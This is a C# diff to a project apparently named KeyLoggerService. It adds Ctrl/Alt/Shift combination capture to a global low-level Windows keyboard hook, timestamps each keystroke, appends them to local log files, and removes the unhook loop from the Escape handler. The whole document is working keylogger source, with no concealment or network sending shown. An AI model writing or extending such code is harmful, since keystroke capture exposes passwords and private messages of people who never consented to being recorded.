@@ -13,7 +13,7 @@ namespace KeyLoggerService.HookSetting.HookManager
         #region Ket Log Data
 
         private static DateTime _setDataInFileTime = DateTime.Now;
-        private static List<(string, KBDLLHOOKSTRUCT)> hookValue = [];
+        private static List<(string, DateTime,nint,int)> hookValue = [];
 
         #endregion
 
@@ -90,8 +90,9 @@ namespace KeyLoggerService.HookSetting.HookManager
             if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
             {
                 var hookStruct = Marshal.PtrToStructure<KBDLLHOOKSTRUCT>(lParam);
-                ConsoleKey key = (ConsoleKey)hookStruct.vkCode;
-                hookValue.Add((key.ToString(), hookStruct));
+                string key = GetKeyCombination(hookStruct);
+                
+                hookValue.Add((key.ToString(), DateTime.Now,hookStruct.dwExtraInfo,hookStruct.vkCode));
                 System.Console.WriteLine(key.ToString());
 
 
@@ -102,13 +103,8 @@ namespace KeyLoggerService.HookSetting.HookManager
                     hookValue = [];
                 }
 
-                if (key == ConsoleKey.Escape)
+                if (key == "Escape")
                 {
-                    bool res = true;
-                    while (res)
-                    {
-                        res = !NativeMethods.UnhookWindowsHookEx(_hookId);
-                    }
                     Console.WriteLine(" stopppppppppppppppppppppppp");
                     Application.Exit();
                 }
@@ -130,20 +126,18 @@ namespace KeyLoggerService.HookSetting.HookManager
             {
                 data += item.Item1.ToString();
             }
-            data += "\n ------------ new Line ---------------- \n";
             WriteInFile(Path.Combine(ProjDirectory, "Data", "JustKey.txt"), data);
 
 
             // Fulldata
-            data = "";
+            data = " ------------- new Line ----------------- \n";
 
             foreach (var item in hookValue)
             {
                 data +=
-                $@"{item.Item1.ToString()}          {item.Item2.vkCode.ToString()}          {item.Item2.time.ToString()}          {item.Item2.dwExtraInfo.ToString()}" + "\n";
+                $@"{item.Item1.ToString()}          {item.Item2.ToString()}          {item.Item3.ToString()}          {item.Item4.ToString()}" + "\n";
             }
 
-            data += " ------------- new Line ----------------- \n";
             WriteInFile(Path.Combine(ProjDirectory, "Data", "Fulldata.txt"), data);
             data = "";
             System.Console.WriteLine("Set Data In Files --- ");
@@ -154,5 +148,24 @@ namespace KeyLoggerService.HookSetting.HookManager
             _ = File.AppendAllTextAsync(filePath, data, Encoding.UTF8);
         }
 
+
+        private static string GetKeyCombination(KBDLLHOOKSTRUCT hookStruct)
+        {
+            Keys key = (Keys)hookStruct.vkCode;
+
+            bool ctrl = (NativeMethods.GetAsyncKeyState(0x11) & 0x8000) != 0;   // VK_CONTROL
+            bool shift = (NativeMethods.GetAsyncKeyState(0x10) & 0x8000) != 0;  // VK_SHIFT
+            bool alt = (NativeMethods.GetAsyncKeyState(0x12) & 0x8000) != 0;    // VK_MENU (Alt)
+
+            string combo = "";
+
+            if (ctrl) combo += "Ctrl + ";
+            if (alt) combo += "Alt + ";
+            if (shift) combo += "Shift + ";
+
+            combo += key.ToString();
+
+            return combo;
+        }
     }
 }
